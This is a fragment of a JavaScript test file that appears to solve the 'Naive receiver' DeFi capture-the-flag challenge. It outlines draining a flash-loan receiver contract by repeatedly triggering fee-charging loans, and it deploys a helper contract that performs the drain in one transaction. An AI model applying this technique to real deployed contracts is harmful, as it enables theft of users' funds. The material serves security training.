...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     * EXPLOIT TYPE 1: calling the flashloan contract 10 times, as it drains the user contract each time with 1 ETH
     */
    // for (let i = 0; i < 10; i++)
    //   await this.pool
    //     .connect(user)
    ...
    /**
     * Another way is to create a middle-man contract which does this whole thing in single transaction
     */
    const HackNaiveRecieverFactory = await ethers.getContractFactory(
      "HackNaiveReciever",
      deployer
    );
    const hackNaiveReciever = await HackNaiveRecieverFactory.deploy();
    await hackNaiveReciever
      .connect(user)
      .performHack(this.receiver.address, this.pool.address);
  });
